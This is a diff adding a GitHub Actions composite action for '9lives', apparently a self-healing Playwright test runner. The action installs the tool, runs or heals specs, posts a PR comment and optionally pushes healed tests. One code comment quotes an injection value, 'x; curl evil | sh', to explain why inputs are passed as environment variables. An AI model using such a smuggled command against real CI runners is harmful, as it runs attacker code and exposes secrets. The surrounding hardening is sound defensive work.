@@ -1,0 +1,133 @@
+name: "9lives"
+description: >-
+  Self-healing QA for the coding-agent era. Runs Playwright specs on YOUR
+  runner with YOUR key (or agent subscription) — no account, nothing leaves
+  your CI. Posts a 🐾 report on the PR; optionally commits healed tests.
+author: QualityMax
+branding:
+  icon: heart
+  color: purple
+
+inputs:
+  specs:
+    description: "Space-separated spec paths or globs (e.g. 'tests/**/*.spec.ts')"
+    required: true
+  mode:
+    description: "heal (fix failing specs) or run (report only)"
+    required: false
+    default: heal
+  anthropic-api-key:
+    description: "Anthropic API key for Tier 2 healing (or use openai-api-key)"
+    required: false
+    default: ""
+  openai-api-key:
+    description: "OpenAI API key for Tier 2 healing"
+    required: false
+    default: ""
+  comment:
+    description: "Post the report as a PR comment (pull_request events only)"
+    required: false
+    default: "true"
+  commit-healed:
+    description: "Commit and push healed specs back to the PR branch"
+    required: false
+    default: "false"
+
+outputs:
+  status:
+    description: "passed | healed | failed"
+    value: ${{ steps.nine.outputs.status }}
+  healed:
+    description: "Number of specs healed"
+    value: ${{ steps.nine.outputs.healed }}
+  failed:
+    description: "Number of specs still failing"
+    value: ${{ steps.nine.outputs.failed }}
+
+runs:
+  using: composite
+  steps:
+    - name: Install 9lives
+      shell: bash
+      env:
+        # Route github.action_path through env rather than splicing ${{ }} into
+        # the script body (SAST: no github-context interpolation inside run:).
+        ACTION_PATH: ${{ github.action_path }}
+      run: |
+        python3 -m pip install --quiet "$ACTION_PATH/..[all]"
+
+    - name: Run 9lives
+      id: nine
+      shell: bash
+      env:
+        ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
+        OPENAI_API_KEY: ${{ inputs.openai-api-key }}
+        # Pass inputs as env vars, never interpolate ${{ }} into the script body:
+        # a value like `x; curl evil | sh` would otherwise run on the runner.
+        NINELIVES_SPECS: ${{ inputs.specs }}
+        NINELIVES_MODE: ${{ inputs.mode }}
+      run: |
+        shopt -s globstar nullglob
+        # Intentional unquoted expansion: word-split + glob the spec patterns.
+        specs=( $NINELIVES_SPECS )
+        if [ "${#specs[@]}" -eq 0 ]; then
+          echo "no specs matched '$NINELIVES_SPECS'" >&2
+          exit 1
+        fi
+        if [ "$NINELIVES_MODE" = "heal" ]; then
+          9l heal --yes "${specs[@]}"
+        else
+          9l run "${specs[@]}"
+        fi
+
+    - name: Post PR comment
+      if: ${{ always() && inputs.comment == 'true' && github.event_name == 'pull_request' }}
+      uses: actions/github-script@v7
+      with:
+        script: |
+          const fs = require('fs');
+          const path = '.9lives-report.md';
+          if (!fs.existsSync(path)) return;
+          const body = fs.readFileSync(path, 'utf8');
+          const marker = '🐾 checked by [9lives]';
+          const { data: comments } = await github.rest.issues.listComments({
+            ...context.repo, issue_number: context.issue.number, per_page: 100,
+          });
+          const previous = comments.find(c => c.body && c.body.includes(marker) && c.user.type === 'Bot');
+          if (previous) {
+            await github.rest.issues.updateComment({ ...context.repo, comment_id: previous.id, body });
+          } else {
+            await github.rest.issues.createComment({ ...context.repo, issue_number: context.issue.number, body });
+          }
+
+    - name: Commit healed specs
+      # Never push to a fork (its token is read-only and the target isn't ours);
+      # only same-repo PRs and direct pushes commit healed specs back.
+      if: ${{ always() && inputs.mode == 'heal' && inputs.commit-healed == 'true' && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository) }}
+      shell: bash
+      # Route ref names through env (never splice ${{ }} into the shell script text).
+      env:
+        EVENT_NAME: ${{ github.event_name }}
+        HEAD_REF: ${{ github.head_ref }}
+        REF_NAME: ${{ github.ref_name }}
+      run: |
+        if git diff --quiet; then
+          echo "nothing healed, nothing to commit"
+          exit 0
+        fi
+        # On pull_request the checkout is a detached merge ref, so a bare
+        # `git push` fails — push explicitly to the source branch instead.
+        if [ "$EVENT_NAME" = "pull_request" ]; then
+          target="$HEAD_REF"
+        else
+          target="$REF_NAME"
+        fi
+        if [ -z "$target" ]; then
+          echo "9lives: could not determine a target branch; refusing to push" >&2
+          exit 1
+        fi
+        git config user.name "9lives"
+        git config user.email "9lives-bot@users.noreply.github.com"
+        git add -u
+        git commit -m "test: 🐾 heal specs (9lives)"
+        git push origin "HEAD:$target"
